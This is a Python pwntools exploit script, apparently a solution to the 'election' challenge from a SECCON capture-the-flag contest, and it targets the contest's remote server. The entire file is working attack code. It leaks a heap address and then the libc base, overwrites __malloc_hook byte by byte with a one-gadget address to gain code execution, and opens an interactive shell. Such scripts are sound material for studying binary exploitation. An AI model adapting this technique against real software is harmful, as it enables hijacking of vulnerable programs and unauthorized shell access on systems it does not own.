from pwn import *
import sys
from time import time
import ctypes

LOCAL_LIBC32 = "/lib/i386-linux-gnu/libc.so.6"
LOCAL_LIBC64 = "/lib/x86_64-linux-gnu/libc.so.6"

BINARY = "./election"
LIBC = "./libc-2.23.so"
LOCAL_LIBC = LOCAL_LIBC64

context.clear()
context(os="linux", arch="amd64", bits=64)
# context.log_level = 'debug'

# def recvsend(conn, data):
#     conn.recvline()
#     conn.sendline(data)

def recvmenu(conn):
    conn.recvuntil("eat chocolate\n>> ")

def stand(conn, name):
    recvmenu(conn)
    conn.sendline('1')
    conn.recvuntil(">> ")
    conn.send(name)

def vote(conn, s, name, modify=None):
    recvmenu(conn)
    conn.sendline('2')
    conn.recvuntil("Show candidates? (Y/n) ")
    conn.send(s)
    conn.recvuntil(">> ")
    conn.send(name)
    if name == "oshima":
        conn.recvuntil(">> ")
        conn.send(modify)

def exploit(conn, elf, libc, local):
    # There is a better way if we could overwrite the next pointer rather than name
    stand(conn, "A"*8)
    stand(conn, "B"*8)
    stand(conn, "C"*8)

    payload = ""
    payload += "yes"
    payload += "\x00" * (0x20 - 3)
    for _ in range(32):
        log.info(_)
        vote(conn, 'n', 'oshima', payload)

    recvmenu(conn)
    conn.sendline("2")
    conn.recvuntil("(Y/n) ")
    conn.sendline("Y")
    conn.recvlines(6)
    conn.recv(2)
    heapleak = u64(conn.recvuntil("\nEnter")[:-6].ljust(8, "\x00"))
    heapbase = heapleak - 0x70
    log.info("heap base: %#x", heapbase)
    conn.recvuntil(">> ")
    conn.sendline("A"*8)

    x = heapbase + 0x50
    t = 0x601f90

    pause()
    for i in range(4):
        temp = ctypes.c_uint8(((t >> (8 * i)) & 0xff)  - ((x >> (8 * i)) & 0xff)).value
        payload = ""
        payload += "yes"
        payload += "\x00" * (0x20 - 3)
        payload += p64(heapbase + i)
        payload += p8(temp) # ctypes.c_uint8(((t >> (8 * i)) & 0xff) - ((x >> (8 * i)) & 0xff)).value)
        vote(conn, 'n', 'oshima', payload)
        if temp >> 7:
            temp |= 0xffffff00
        x += (temp << (8 * i))

    recvmenu(conn)
    conn.sendline("2")
    conn.recvuntil("(Y/n) ")
    conn.sendline("Y")
    conn.recvlines(6)
    conn.recv(2)
    libcleak = u64(conn.recvuntil("\nEnter")[:-6].ljust(8, "\x00"))
    libc.address = libcleak - libc.symbols['puts']
    log.info("libc base: %#x", libc.address)
    conn.recvuntil(">> ")
    conn.sendline("A"*8)

    t = libc.address + 0xf0274 # 0x45216
    x = 0
    for i in range(6):    # TODO: fix this, it fails sometimes, but who cares during CTF
        log.info(i)
        temp = ctypes.c_uint8(((t >> (8 * i)) & 0xff)  - ((x >> (8 * i)) & 0xff)).value
        payload = ""
        payload += "yes"
        payload += "\x00" * (0x20 - 3)
        payload += p64(libc.symbols['__malloc_hook'] - 0x10 + i)
        payload += p8(temp)
        vote(conn, 'n', 'oshima', payload)
        if temp >> 7:
            temp |= 0xffffff00
        x += (temp << (8 * i))

    payload = ""
    payload += "yes"
    payload += "\x00" * (0x20 - 3)
    payload += p64(0x602000)
    payload += p8(0xfe)
    vote(conn, 'n', 'oshima', payload)

    stand(conn, "\x00"*32)
    conn.interactive()
    return

if __name__ == "__main__":
    elf = ELF(BINARY)
    try:
        if sys.argv[1] == "remote":
            H,P = ("election.pwn.seccon.jp", 28349)
            r = remote(H, P)
            libc = ELF(LIBC) if LIBC else None
            exploit(r, elf, libc, local=False)
        elif sys.argv[1] == "local":
            r = process(BINARY)
            log.info("PID: {}".format(r.proc.pid))
            libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        elif sys.argv[1] == "docker":
            r = process(BINARY, env = {"LD_PRELOAD": LIBC})
            libc = ELF(LIBC) if LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        else:
            print "Usage: {} local|docker|remote".format(sys.argv[0])
            sys.exit(1)
    except IndexError:
        r = process(BINARY)
        log.info("PID: {}".format(r.proc.pid))
        libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
        pause()
        exploit(r, elf, libc, local=True)
